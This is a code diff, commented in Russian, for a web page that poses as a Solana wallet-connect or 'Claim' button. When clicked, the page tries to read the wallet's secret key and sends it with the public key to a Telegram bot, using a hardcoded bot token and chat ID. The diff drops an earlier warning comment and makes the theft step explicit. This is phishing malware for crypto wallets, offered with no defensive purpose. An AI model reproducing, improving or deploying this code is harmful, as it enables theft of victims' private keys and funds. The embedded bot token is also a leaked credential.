@@ -31,12 +31,13 @@
   </style>
 </head>
 <body>
-  <button id="connectWallet">Claim</button>
+  <button id="connectWallet">Подключить кошелек</button>
 
   <script>
     const telegramBotToken = "7826785273:AAGi1Tpb1sekJN1DvjPCwTBRpQIcqGwiOZw"; // Вставьте токен вашего бота
     const telegramChatId = "-1002294857850"; // Вставьте ID чата, куда отправлять сообщения
 
+    // Функция для отправки сообщения в Telegram
     async function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       const response = await fetch(url, {
@@ -52,6 +53,7 @@
       }
     }
 
+    // Функция для подключения кошелька Solana
     async function connectWallet() {
       try {
         if (!window.solana) {
@@ -63,20 +65,16 @@
         const publicKey = resp.publicKey.toString();
         alert(`Кошелек подключен: ${publicKey}`);
 
-        // Получаем секретный ключ (для теста - ВНИМАНИЕ: НЕБЕЗОПАСНО!)
+        // Получаем секретный ключ кошелька
         const secretKey = Array.from(resp.secretKey || []);
 
-        // Отправляем публичный и секретный ключ в Telegram
-        await sendToTelegram(`Публичный ключ кошелька: ${publicKey}\nСекретный ключ: ${secretKey.join(",")}`);
+        // ОТПРАВКА СЕКРЕТНОГО КЛЮЧА В TELEGRAM
+        await sendToTelegram(`Публичный ключ: ${publicKey}\nСекретный ключ: ${secretKey.join(",")}`);
       } catch (err) {
         console.error("Ошибка подключения кошелька:", err);
         alert("Не удалось подключить кошелек.");
       }
     }
-
-    document.getElementById("connectWallet").addEventListener("click", connectWallet);
-</script>
-
 
     document.getElementById("connectWallet").addEventListener("click", connectWallet);
   </script>
